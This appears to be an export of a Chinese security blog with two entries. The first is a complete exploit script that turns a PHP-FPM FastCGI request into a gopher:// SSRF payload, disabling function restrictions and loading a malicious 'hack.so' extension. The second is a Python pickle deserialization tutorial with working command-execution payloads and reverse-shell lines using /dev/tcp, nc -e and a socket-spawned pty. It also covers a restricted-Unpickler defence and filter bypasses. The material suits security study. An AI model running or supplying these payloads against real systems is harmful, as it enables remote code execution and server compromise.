import socketimport randomimport argparseimport sysfrom io import BytesIO# 修改点 1from urllib.parse import quote# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;)    else:        s = str(s)    return sclass FastCGIClient:    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        # 修改点 2        # try:        #     self.sock.connect((self.host, int(self.port)))        # except socket.error as msg:        #     self.sock.close()        #     self.sock = None        #     print(repr(msg))        #     return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \              + bchr(fcgi_type) \              + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \              + bchr(requestid &amp; 0xFF) \              + bchr((length &gt;&gt; 8) &amp; 0xFF) \              + bchr(length &amp; 0xFF) \              + bchr(0) \              + bchr(0) \              + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b&#x27;&#x27;        if nLen &lt; 128:            record += bchr(nLen)        else:            record += bchr((nLen &gt;&gt; 24) | 0x80) \                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(nLen &amp; 0xFF)        if vLen &lt; 128:            record += bchr(vLen)        else:            record += bchr((vLen &gt;&gt; 24) | 0x80) \                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(vLen &amp; 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header[&#x27;version&#x27;] = bord(stream[0])        header[&#x27;type&#x27;] = bord(stream[1])        header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])        header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])        header[&#x27;paddingLength&#x27;] = bord(stream[6])        header[&#x27;reserved&#x27;] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record[&#x27;content&#x27;] = b&#x27;&#x27;            if &#x27;contentLength&#x27; in record.keys():                contentLength = int(record[&#x27;contentLength&#x27;])                record[&#x27;content&#x27;] += buffer.read(contentLength)            if &#x27;paddingLength&#x27; in record.keys():                skiped = buffer.read(int(record[&#x27;paddingLength&#x27;]))            return record    def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;):        if not self.__connect():            print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)            return        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] = dict()        request = b&quot;&quot;        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b&#x27;&#x27;        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId)        # 修改点 3        # self.sock.send(request)        # self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND        # self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;        # return self.__waitForResponse(requestId)        return request    def __waitForResponse(self, requestId):        data = b&#x27;&#x27;        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:                if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response[&#x27;requestId&#x27;]):                    self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;]            if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId][&#x27;response&#x27;]    def __repr__(self):        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;:    parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;)    parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;)    parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;)    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;)    parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = &quot;/&quot;    uri = args.file    content = args.code    params = &#123;        &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,        &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;,        &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;),        &#x27;SCRIPT_NAME&#x27;: uri,        &#x27;QUERY_STRING&#x27;: &#x27;&#x27;,        &#x27;REQUEST_URI&#x27;: uri,        &#x27;DOCUMENT_ROOT&#x27;: documentRoot,        &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,        &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,        &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;,        &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,        &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,        &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,        &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;,        &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;,        &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content),        &#x27;PHP_VALUE&#x27;: &#x27;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hack.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &#x27;,        &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;    &#125;    # 修改点 4    # response = client.request(params, content)    # print(force_text(response))    request_ssrf = quote(client.request(params, content))    print(&quot;gopher://127.0.0.1:&quot; + str(args.port) + &quot;/_&quot; + request_ssrf)

用法和原来一样
python fpm.py 127.0.0.1 -p 9001 /var/www/html/add_api.php -c &quot;&lt;?php phpinfo(); ?&gt;&quot;
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>php</tag>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>python反序列化</title>
    <url>/posts/ab2b72a2/</url>
    <content><![CDATA[python的序列化和反序列化与PHP，Java类似，python的序列化和反序列化就是对象与数据的相互转换，是为了解决对象传输与持久化存储问题
在Python中序列化一般通过pickle模块和json模块实现
pickle模块和json模块提供了dumps()、dump()、loads()、load()四个函数



函数
说明



dump()
对象反序列化到文件对象并存入文件


dumps()
对象反序列化为 bytes 对象


load()
对象反序列化并从文件中读取数据


loads()
从 bytes 对象反序列化


与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型
PVM
python序列化和反序列化的过程都是发生在PVM(Pickle Virtual Machine)上的，它是Python标准库中的一部分，由Python的pickle模块提供支持

pvm由指令处理器、栈区和内存区三部分组成

指令处理器：也就是引擎，从流中读取opcode和参数, 并对其进行解释处理. 重复这个动作, 直到遇到.这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回

栈区：由Python的list实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果

内存区：或者称为标签区，由Python的dict实现, 为PVM的整个生命周期提供存储（将反序列化完成的数据以 key-value 的形式储存在memo中，以便后来使用）


PVM 协议因为python版本的不同，所以默认使用的协议不同。因为PVM的指令集用的协议有很大的差别，所以不同的python版本序列化出来的数据是有差别的
可以通过protocol=num来选择opcode的版本，pickle协议是向前兼容的
import pickleclass Test:    def __init__(self, name=&#x27;lewiserii&#x27;):        self.name = nametest = Test()for i in range(6):    print(&#x27;[+] pickle v&#123;&#125;: &#123;&#125;&#x27;.format(str(i), pickle.dumps(test, protocol=i)))

[+] pickle v0: b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVlewiserii\np7\nsb.&#x27;[+] pickle v1: b&#x27;ccopy_reg\n_reconstructor\nq\x00(c__main__\nTest\nq\x01c__builtin__\nobject\nq\x02Ntq\x03Rq\x04&#125;q\x05X\x04\x00\x00\x00nameq\x06X\t\x00\x00\x00lewiseriiq\x07sb.&#x27;[+] pickle v2: b&#x27;\x80\x02c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\t\x00\x00\x00lewiseriiq\x04sb.&#x27;[+] pickle v3: b&#x27;\x80\x03c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\t\x00\x00\x00lewiseriiq\x04sb.&#x27;[+] pickle v4: b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tlewiserii\x94sb.&#x27;[+] pickle v5: b&#x27;\x80\x05\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tlewiserii\x94sb.&#x27;

不同版本间的区别
v0 版协议是原始的&quot;人类可读&quot;协议，并且向后兼容早期版本的 Pythonv1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）

opcodeopcode也就是操作码，是序列化内容的核心，并且 opcode 是单字节的
在$PYTHON/Lib/pickle.py中可以查看到完整的opcode
以下是V0协议中一些常见的
MARK           = b&#x27;(&#x27;   # 向栈中压入一个 MARK 标记STOP           = b&#x27;.&#x27;   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值POP            = b&#x27;0&#x27;   # 丢弃栈顶对象POP_MARK       = b&#x27;1&#x27;   # 丢弃栈顶到最顶层的标记对象DUP            = b&#x27;2&#x27;   # 重复的顶部堆栈项目FLOAT          = b&#x27;F&#x27;   # 实例化一个 float 对象INT            = b&#x27;I&#x27;   # 实例化一个 int 或者 bool 对象NONE           = b&#x27;N&#x27;   # 栈中压入 NoneREDUCE         = b&#x27;R&#x27;   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈STRING         = b&#x27;S&#x27;   # 实例化一个字符串对象UNICODE        = b&#x27;V&#x27;   # 实例化一个 UNICODE 字符串对象APPEND         = b&#x27;a&#x27;   # 将栈的第一个元素 append 到第二个元素（必须为列表）中BUILD          = b&#x27;b&#x27;   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()GLOBAL         = b&#x27;c&#x27;   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈DICT           = b&#x27;d&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果EMPTY_DICT     = b&#x27;&#125;&#x27;   # 向栈中直接压入一个空字典APPENDS        = b&#x27;e&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中GET            = b&#x27;g&#x27;   # 将 memo[n] 的压入栈INST           = b&#x27;i&#x27;   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）LIST           = b&#x27;l&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表EMPTY_LIST     = b&#x27;]&#x27;   # 向栈中直接压入一个空列表OBJ            = b&#x27;o&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，PUT            = b&#x27;p&#x27;   # 将栈顶对象储存至 memo[n]SETITEM        = b&#x27;s&#x27;   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中TUPLE          = b&#x27;t&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果EMPTY_TUPLE    = b&#x27;)&#x27;   # 向栈中直接压入一个空元组SETITEMS       = b&#x27;u&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中


处理序列化字节流的过程 这里用一段简短的字节码来演示利用过程:
cossystem(S&#x27;whoami&#x27;tR.

按照pickle.py中的源码分析处理序列化字节流的过程
c
获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈
源代码：
def load_global(self):    # 读取一行数据，去掉换行符，作为模块名，例子中是os    module = self.readline()[:-1].decode(&quot;utf-8&quot;)    # 读取下一行数据，作为类名，例子中是system    name = self.readline()[:-1].decode(&quot;utf-8&quot;)    # 调用find_class    klass = self.find_class(module, name)    # 获取模块后添加到当前栈中    self.append(klass)dispatch[GLOBAL[0]] = load_globaldef find_class(self, module, name):    # Subclasses may override this.    # 在系统审计功能记录pickle.find_class事件，附带参数module和name    sys.audit(&#x27;pickle.find_class&#x27;, module, name)    # 如果协议版本小于3且开启了fix_imports标志，则进行特殊的名称和模块映射处理    if self.proto &lt; 3 and self.fix_imports:        # 如果(module, name)在NAME_MAPPING中，则使用映射的名称代替原名称        if (module, name) in _compat_pickle.NAME_MAPPING:            module, name = _compat_pickle.NAME_MAPPING[(module, name)]        # 如果module在IMPORT_MAPPING中，则使用映射的模块名代替原模块名        elif module in _compat_pickle.IMPORT_MAPPING:            module = _compat_pickle.IMPORT_MAPPING[module]    # 动态加载指定模块    __import__(module, level=0)    # 如果协议版本大于4则使用_getattribute方法获取对象    if self.proto &gt;= 4:        return _getattribute(sys.modules[module], name)[0]    # 否则使用getattr方法获取对象    else:        return getattr(sys.modules[module], name)# 与getattr类似def _getattribute(obj, name):    # 将属性名按照点号（.）进行分割    for subpath in name.split(&#x27;.&#x27;):        if subpath == &#x27;&lt;locals&gt;&#x27;:            raise AttributeError(&quot;Can&#x27;t get local attribute &#123;!r&#125; on &#123;!r&#125;&quot;                                 .format(name, obj))        try:            parent = obj            obj = getattr(obj, subpath)        except AttributeError:            raise AttributeError(&quot;Can&#x27;t get attribute &#123;!r&#125; on &#123;!r&#125;&quot;                                 .format(name, obj)) from None    return obj, parent

(
向栈中压入一个 MARK 标记
源代码：
def load_mark(self):    # 将当前stack列表添加到metastack中，相当于标记    self.metastack.append(self.stack)    # 清空当前栈    self.stack = []    # 设置一个简化的append方法    self.append = self.stack.appenddispatch[MARK[0]] = load_mark

S
实例化一个字符串对象
源代码：
def load_string(self):    # 读取一行数据，去除换行符    data = self.readline()[:-1]    # 去掉最外面的引号    if len(data) &gt;= 2 and data[0] == data[-1] and data[0] in b&#x27;&quot;\&#x27;&#x27;:        data = data[1:-1]    else:        raise UnpicklingError(&quot;the STRING opcode argument must be quoted&quot;)    # 对数据解码后添加到当前栈中    self.append(self._decode_string(codecs.escape_decode(data)[0]))dispatch[STRING[0]] = load_stringdef _decode_string(self, value):    # Used to allow strings from Python 2 to be decoded either as    # bytes or Unicode strings.  This should be used only with the    # STRING, BINSTRING and SHORT_BINSTRING opcodes.    if self.encoding == &quot;bytes&quot;:        return value    else:        return value.decode(self.encoding, self.errors)

t
寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果
源代码：
def load_tuple(self):    # 弹出当前栈中数据    items = self.pop_mark()    # 转成tuple类型并添加到还原后的栈中    self.append(tuple(items))dispatch[TUPLE[0]] = load_tupledef pop_mark(self):    # 返回当前的stack到items    items = self.stack    # 从metastack还原之前的stack    self.stack = self.metastack.pop()    self.append = self.stack.append    return items



R
从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈
源代码：
def load_reduce(self):    stack = self.stack    # 第一个对象作为参数    args = stack.pop()    # 第二个对象作为函数    func = stack[-1]    # 调用func函数，并把结果赋给栈顶    stack[-1] = func(*args)dispatch[REDUCE[0]] = load_reduce


.
程序结束，栈顶的一个元素作为 pickle.loads() 的返回值
源代码：
# 结束反序列化def load_stop(self):    # 栈顶的值作为返回值    value = self.stack.pop()    raise _Stop(value)dispatch[STOP[0]] = load_stop




所以可以得到以下解释
c后面跟的是模块名，换行之后的是类名，相当于将os.system放入栈中，然后放入一个标记符，接着将字符串 whoami 放入栈中，遇到t将栈中的数据弹出，一直到标记，并转为 tuple 再存入栈中，同时标记符消失，遇到R后将元组取出，作为参数放入函数中执行后将结果返回
可以看作执行了os.system(&#39;whoami&#39;)

pickletools当字节码很多的时候一个一个对着表去读会很麻烦，所以Python提供了pickletools工具，便于人工解读opcode
pickletools常用的有pickletools.dis和pickletools.optimize
pickletools.dis：具有反汇编的功能，可以以可读性较强的方式展示一个序列化对象

pickletools.optimize：对一个序列化结果进行优化（消除未使用的 PUT 操作码）

常见利用思路漏洞产生原因是用户可控的反序列化入口点
魔术方法 __reduce__()
PVM 的 操作码 R 就是 __reduce__() 的返回值的一个底层实现与php中的__wakeup()方法类似，python在反序列化时会先调用__reduce__()魔术方法，所以我们可以利用这一特点触发恶意代码

一个利用__reduce__()的例子，在能够传入可控的 pickle.loads 的 data 时就可以生效
但是需要注意reduce一次只能执行一个函数
import pickleimport pickletoolsimport os# 注意python2与python3 之间的新式类与旧式类的区别，python2需要手动继承objectclass Test(object):    def __reduce__(self):        shell = &quot;&quot;&quot;whoami&quot;&quot;&quot;          # 要执行的命令        return os.system, (shell,)    # reduce函数必须返回元组或字符串test = Test()a = pickle.dumps(test, protocol=0)pickle.loads(a)print(a)pickletools.dis(pickletools.optimize(a))



全局变量覆盖
可以通过覆盖一些凭证达到绕过身份验证的目的

import pickleimport pickletoolsimport secretprint(&quot;变量的值为:&quot; + secret.key)opcode = b&#x27;&#x27;&#x27;c__main__secret(S&#x27;key&#x27;S&#x27;123&#x27;db.&#x27;&#x27;&#x27;pickle.loads(opcode)print(&quot;变量的值为:&quot; + secret.key)pickletools.dis(opcode)


全局变量引用import pickleimport pickletoolsimport secretclass Target:    def __init__(self):        obj = pickle.loads(b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nVa\nsb.&#x27;)        if obj.pwd == secret.pwd:            print(&quot;Hello, admin!&quot;)        else:            print(&quot;No&quot;)test = Target()

上面的例子中我们并不知道secret.pwd的值，要使if成立，可以使用c来实现
c的作用是 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈
b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nVaaa\nsb.&#x27;b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.&#x27;



与php反序列化中的$this-&gt;b = &amp;$this-&gt;a;引用绕过类似，只不过python用的是import

命令执行pickle中用来构造函数执行的字节码有四个个：R、i、o以及b +__setstate__()
R上文中提到的例子用的就是R来实现Rce

R: 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈

opcode=b&#x27;&#x27;&#x27;cossystem(S&#x27;whoami&#x27;tR.&#x27;&#x27;&#x27;




i
相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）

def load_inst(self):    # 前三行代码与c的代码一致，用来调用    module = self.readline()[:-1].decode(&quot;ascii&quot;)    name = self.readline()[:-1].decode(&quot;ascii&quot;)    klass = self.find_class(module, name)    # 通过pop_mark()函数得到参数，利用_instantiate函数执行，将结果存入栈中    self._instantiate(klass, self.pop_mark())dispatch[INST[0]] = load_instdef _instantiate(self, klass, args):    if (args or not isinstance(klass, type) or        hasattr(klass, &quot;__getinitargs__&quot;)):        try:            value = klass(*args)        except TypeError as err:            raise TypeError(&quot;in constructor for %s: %s&quot; %                            (klass.__name__, str(err)), sys.exc_info()[2])    else:        value = klass.__new__(klass)    self.append(value)


opcode=b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;iossystem.&#x27;&#x27;&#x27;

o
从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果

def load_obj(self):    # 弹出栈中所有数据赋值给args    args = self.pop_mark()    # 在args中弹出第一个作为类名    cls = args.pop(0)    # 利用_instantiate函数执行并将结果压回栈中    self._instantiate(cls, args)dispatch[OBJ[0]] = load_obj


opcode=b&#x27;&#x27;&#x27;(cossystemS&#x27;whoami&#x27;o.&#x27;&#x27;&#x27;

b + __setstate__()
使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()

def load_build(self):    stack = self.stack    # 获取栈顶元素    state = stack.pop()    # 获取栈中倒数第二个元素    inst = stack[-1]    # 获取倒数第二个元素的__setstate__属性    setstate = getattr(inst, &quot;__setstate__&quot;, None)    # setstate 不为None则调用inst对象的__setstate，将state作为参数传递给它    # 一般不存在__setstate__方法，setstate(state)会造成任意函数调用    if setstate is not None:        setstate(state)        return    slotstate = None    # 如果state是元组类型且长度为2，则将其分解成state, slotstate    if isinstance(state, tuple) and len(state) == 2:        state, slotstate = state    if state:        inst_dict = inst.__dict__        intern = sys.intern        # 遍历state字典，将键名赋值给inst_dict，键值直接赋值        for k, v in state.items():            if type(k) is str:                inst_dict[intern(k)] = v            else:                inst_dict[k] = v    if slotstate:        # 遍历slotstate字典，并将其键值对赋值给inst对象        for k, v in slotstate.items():            setattr(inst, k, v)dispatch[BUILD[0]] = load_build

因为一般不存在__setstate__，所以不会触发setstate(state)。但是如果手动压入一个字典&#123;&quot;__setstate__&quot;:os.system&#125;，执行b。就会添加一个新的键值对，再继续压入命令，再执行b时，setstate就不会为None了，而是我们传入的os.system，就是os.system(state)，而state就是我们传入的命令，从而完成rce
import pickleimport pickletoolsclass Test(object):    def __init__(self, name):        self.name = &quot;aa&quot;opcode = b&#x27;&#x27;&#x27;(c__main__Test)o(S&quot;__setstate__&quot;cossystemdbS&quot;whoami&quot;b.&#x27;&#x27;&#x27;pickle.loads(opcode)pickletools.dis(opcode)&#x27;&#x27;&#x27;lewiserii\lewiserii    0: (    MARK    1: c        GLOBAL     &#x27;__main__ Test&#x27;   16: )        EMPTY_TUPLE   17: o        OBJ        (MARK at 0)   18: (    MARK   19: S        STRING     &#x27;__setstate__&#x27;   35: c        GLOBAL     &#x27;os system&#x27;   46: d        DICT       (MARK at 18)   47: b    BUILD   48: S    STRING     &#x27;whoami&#x27;   58: b    BUILD   59: .    STOPhighest protocol among opcodes = 1&#x27;&#x27;&#x27;

反弹shell既然可以执行命令了，那么肯定可以反弹shell了，以下是几种payload
利用i执行命令建立shell
import base64import picklepayload= b&#x27;&#x27;&#x27;(S&#x27;python -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;, port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;iossystem.&#x27;&#x27;&#x27;payload2 = b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;iospopen.&#x27;&#x27;&#x27;print(base64.b64encode(pickle.dumps(payload)))

reduce直接执行nc命令
import base64import pickleclass Test(object):    def __reduce__(self):        return (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e/bin/sh&#x27;)&quot;,))payload = Test()print(base64.b64encode(pickle.dumps(payload)))


pker
pker是由eddieivan01编写的以遍历Python AST的形式来自动化解析pickle opcode的工具。

漏洞修复 对于pickle反序列化漏洞，常见的修复方法是重写Unpickler.find_class()来限制全局变量
例如：
import builtinsimport ioimport pickle# 需要限制反序列化对象时可以使用的类safe_builtins = &#123;    &#x27;range&#x27;,        # range类型    &#x27;complex&#x27;,      # 复数类型    &#x27;set&#x27;,          # 集合类型    &#x27;frozenset&#x27;,    # 冻结集合类型    &#x27;slice&#x27;,        # 切片类型&#125;# 定义RestrictedUnpickler类继承自pickle.Unpicklerclass RestrictedUnpickler(pickle.Unpickler):    #重写了find_class方法    def find_class(self, module, name):        # 如果被反序列化的对象的类属于builtins模块中的安全类，则返回该类        if module == &quot;builtins&quot; and name in safe_builtins:            return getattr(builtins, name)        # 如果不是安全类，就抛出异常，禁止反序列化        raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; %                                     (module, name))# 定义一个帮助函数restricted_loads来反序列化对象def restricted_loads(s):    # 将传入的字符串s转换为bytes，并使用RestrictedUnpickler类反序列化    return RestrictedUnpickler(io.BytesIO(s)).load()opcode=b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;restricted_loads(opcode)###结果如下Traceback (most recent call last):..._pickle.UnpicklingError: global &#x27;os.system&#x27; is forbidden

以上例子通过重写Unpickler.find_class()方法，限制调用模块只能为builtins，且函数必须在白名单内，否则抛出异常。
bypass关键字绕过
利用opcode进行变量覆盖时，代码中可能会过滤了我们想要覆盖的属性关键字

例如
import pickleimport pickletoolsimport secretprint(&quot;变量的值为:&quot; + secret.key)if b&#x27;key&#x27; in opcode:    print(&#x27;NoNoNo&#x27;)else:    pickle.loads(opcode)print(&quot;变量的值为:&quot; + str(secret.key))

正常的opcode应该是
opcode = b&#x27;&#x27;&#x27;c__main__secret(S&#x27;key&#x27;S&#x27;123&#x27;db.&#x27;&#x27;&#x27;

方法一：十六进制
因为 S 操作符是可以识别十六进制的，所以这里也可以对字符进行十六进制编码来绕过
